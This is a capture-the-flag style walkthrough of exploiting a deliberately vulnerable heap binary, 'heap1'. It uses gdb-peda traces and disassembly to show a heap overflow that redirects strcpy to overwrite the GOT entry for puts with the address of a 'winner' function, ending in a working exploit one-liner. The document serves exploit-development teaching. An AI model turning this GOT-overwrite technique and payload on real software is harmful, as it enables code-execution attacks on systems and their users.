

```asm
    8048565:   e8 06 fe ff ff          call   8048370 <strcpy@plt>
    804856a:   83 c4 10                add    esp,0x10
    804856d:   8b 43 04                mov    eax,DWORD PTR [ebx+0x4]
    8048570:   83 c0 08                add    eax,0x8
    8048573:   8b 10                   mov    edx,DWORD PTR [eax]
    8048575:   8b 45 f0                mov    eax,DWORD PTR [ebp-0x10]
    8048578:   8b 40 04                mov    eax,DWORD PTR [eax+0x4]
    804857b:   83 ec 08                sub    esp,0x8
    804857e:   52                      push   edx
    804857f:   50                      push   eax
    8048580:   e8 eb fd ff ff          call   8048370 <strcpy@plt>
```

in gdb:

``` sh
gdb-peda$ b *0x8048565
Breakpoint 1 at 0x8048565
gdb-peda$ b *0x8048580
Breakpoint 2 at 0x8048580
gdb-peda$ r aaaaa bbbbb

```

now let's take a look see



```asm
       0x8048560 <main+126>:	sub    esp,0x8
       0x8048563 <main+129>:	push   edx
       0x8048564 <main+130>:	push   eax
    => 0x8048565 <main+131>:	call   0x8048370 <strcpy@plt>
       0x804856a <main+136>:	add    esp,0x10
       0x804856d <main+139>:	mov    eax,DWORD PTR [ebx+0x4]
       0x8048570 <main+142>:	add    eax,0x8
       0x8048573 <main+145>:	mov    edx,DWORD PTR [eax]
    Guessed arguments:
    arg[0]: 0x804a018 --> 0x0
    arg[1]: 0xffffdcee ("aaaa")
```
so now we can continue
```sh
gdb-peda$ c
```
and have another look see
```asm
       0x804857b <main+153>:	sub    esp,0x8
       0x804857e <main+156>:	push   edx
       0x804857f <main+157>:	push   eax
    => 0x8048580 <main+158>:	call   0x8048370 <strcpy@plt>
       0x8048585 <main+163>:	add    esp,0x10
       0x8048588 <main+166>:	sub    esp,0xc
       0x804858b <main+169>:	push   0x804864b
       0x8048590 <main+174>:	call   0x8048390 <puts@plt>
    Guessed arguments:
    arg[0]: 0x804a038 --> 0x0
    arg[1]: 0xffffdcf3 ("bbbb")
```

now let's see if we can break it!

```sh
gdb-peda$ r aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa bbbbb
```


```asm
   0x8048560 <main+126>:	sub    esp,0x8
   0x8048563 <main+129>:	push   edx
   0x8048564 <main+130>:	push   eax
=> 0x8048565 <main+131>:	call   0x8048370 <strcpy@plt>
   0x804856a <main+136>:	add    esp,0x10
   0x804856d <main+139>:	mov    eax,DWORD PTR [ebx+0x4]
   0x8048570 <main+142>:	add    eax,0x8
   0x8048573 <main+145>:	mov    edx,DWORD PTR [eax]
Guessed arguments:
arg[0]: 0x804a018 --> 0x0
arg[1]: 0xffffdcb6 ('a' <repeats 57 times>)
```
nothing interesting yet...

and so we continue

```sh
    gdb-peda$ c
```
and take a look see
```asm
   0x804857b <main+153>:	sub    esp,0x8
   0x804857e <main+156>:	push   edx
   0x804857f <main+157>:	push   eax
=> 0x8048580 <main+158>:	call   0x8048370 <strcpy@plt>
   0x8048585 <main+163>:	add    esp,0x10
   0x8048588 <main+166>:	sub    esp,0xc
   0x804858b <main+169>:	push   0x804864b
   0x8048590 <main+174>:	call   0x8048390 <puts@plt>
Guessed arguments:
arg[0]: 0x61616161 ('aaaa')
arg[1]: 0xffffdcf0 ("bbbbbbbbb")
```

Ureka!! We are overwriting the destination address being passed to the `strcpy` function. So we have the ability to perform a .got overwrite. Our plan is to first overwrite the destination address passed to `strcpy` with the `.got` address of `printf` and then use `strcpy` to overwrite that address with the address of the `winner` function.


Let's take another look at the assembly

```asm
8048580:   e8 eb fd ff ff          call   8048370 <strcpy@plt>
 8048585:   83 c4 10                add    esp,0x10
 8048588:   83 ec 0c                sub    esp,0xc
 804858b:   68 4b 86 04 08          push   0x804864b
 8048590:   e8 fb fd ff ff          call   8048390 <puts@plt>
```

Even though `printf` is called in the C code, `puts` is being called in the assembly. So lets take a closer look at the .plt definition of `puts`.


```asm
 08048390 <puts@plt>:
8048390:   ff 25 a0 98 04 08       jmp    DWORD PTR ds:0x80498a0
8048396:   68 20 00 00 00          push   0x20
804839b:   e9 a0 ff ff ff          jmp    8048340 <_init+0x2c>
```

so `0x80498a0` is the .got address of puts. So all we need to do is overwrite that address with the address of `winner`

```asm
080484bb <winner>:
80484bb:   55                      push   ebp
80484bc:   89 e5                   mov    ebp,esp
....
```


```sh
[kablaa@superhacker9000 heap1]$ ./heap1 $(python2.7 -c 'print "a"*20 + "\xa0\x98\x04\x08" + " " + "\xbb\x84\x04\x08"')
and we have a winner @ 1453579246
[kablaa@superhacker9000 heap1]$

```
